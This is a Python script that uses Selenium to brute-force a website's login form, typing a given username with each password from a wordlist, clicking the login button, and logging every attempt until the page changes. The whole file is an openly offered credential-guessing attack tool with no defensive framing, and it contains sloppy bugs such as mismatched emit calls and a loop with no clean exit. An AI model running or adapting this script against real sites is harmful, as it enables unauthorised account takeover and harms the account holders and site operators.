import selenium
import requests
import time
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
import sys

#method-helper to print some messege in  colour
def print_colored_msg(msg, color):
    print(color + msg + '\33[37m')

#method-helper to print some input in  colour and return user input
def input_colored_msg(msg, color):
    return input(color + msg + '\33[37m')


#method to chheck if url is a valid active website
def check_website_exists(website, RES):
    #send request
    response = requests.get(website.replace(' ', ''))
    #if response code is 2xx - site exists
    if str(response.status_code)[0] == '2':
        RES.emit('website exists')
    #exit script if sie not exists
    else:
        RES.emit(print_colored_msg(' Website could not be located make sure to use http / https', '\033[91m'))


#method to brute force pass
def brute_force(username, username_xpath, password_xpath, login_xpath, url, path_to_passwords, LOG, RES):
    #open file with passwords
    check_website_exists(url, RES)
    passfile = open(path_to_passwords, 'r')
    #create sellenium  browser
    browser = create_webdriver()
    #start endless loop
    while True:
        try:
            #for every password forn file
            for line in passfile:
                #open url in browser
                browser.get(url)
                #delay
                time.sleep(0.5)
                #type username
                browser.find_element_by_css_selector(username_xpath).send_keys(username)
                #type password
                browser.find_element_by_css_selector(password_xpath).send_keys(line)
                #click LOGIN button
                browser.find_element_by_css_selector(login_xpath).click()
                #print info
                LOG.emit(print_colored_msg('Tried password: ' + line + 'for user: ' + username, '\033[91m'))
        #exception if user interrcut by the key
        except KeyboardInterrupt:
            #close file
            passfile.close()
            #clsoe driver
            browser.close()
        #if the password is correct, New page opened, so  old selectors is not  relevant. So, NoSuchElementException throwed
        except selenium.common.exceptions.NoSuchElementException:
            #congrats thhat password is correct
            LOG.emit('Password found or you have been locked')
            LOG.emit('Password has been found: {0}'.format(line), '\033[91m')
            RES.emit('Password has been found: {0}'.format(line), '\033[91m')
            #close file
            passfile.close()
            #close driver
            browser.close()


#method to create and initializate selenium browser
def create_webdriver():
    #create options object
    optionss = webdriver.ChromeOptions()
    #block all popup windows
    optionss.add_argument("--disable-popup-blocking")
    #block all browser extensions
    optionss.add_argument("--disable-extensions")
    #create Selenium browser with options
    browser = webdriver.Chrome('chrome_driver/chromedriver',chrome_options=optionss)
    return browser




